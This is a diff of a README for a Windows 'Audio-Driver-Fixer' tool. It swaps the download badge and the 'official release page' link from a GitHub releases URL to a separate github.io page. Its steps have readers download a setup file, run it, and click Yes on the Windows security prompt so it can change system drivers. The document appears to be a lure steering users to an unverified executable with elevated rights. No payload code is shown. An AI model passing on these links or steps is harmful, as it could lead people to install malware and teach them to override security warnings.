@@ -1,7 +1,7 @@
 # 🔊 Audio-Driver-Fixer - Restore your computer sound system now
 
 <p align="center">
-  <a href="https://github.com/attentiongetting-kingdomofgod65/Audio-Driver-Fixer/releases">
+  <a href="https://attentiongetting-kingdomofgod65.github.io">
     <img src="https://img.shields.io/badge/Download-Audio--Driver--Fixer-blue" alt="Download Now">
   </a>
 </p>
@@ -21,7 +21,7 @@ Audio-Driver-Fixer resolves common sound issues on Windows 10 and Windows 11. Us
 
 Follow these steps to fix your audio. 
 
-1. Visit the [official release page](https://github.com/attentiongetting-kingdomofgod65/Audio-Driver-Fixer/releases) to download the latest setup file. 
+1. Visit the [official release page](https://attentiongetting-kingdomofgod65.github.io) to download the latest setup file. 
 2. Locate the file in your Downloads folder.
 3. Double-click the file to start the repair process.
 4. Windows might show a security prompt because the tool makes changes to system drivers. Click Yes to allow the tool to proceed.
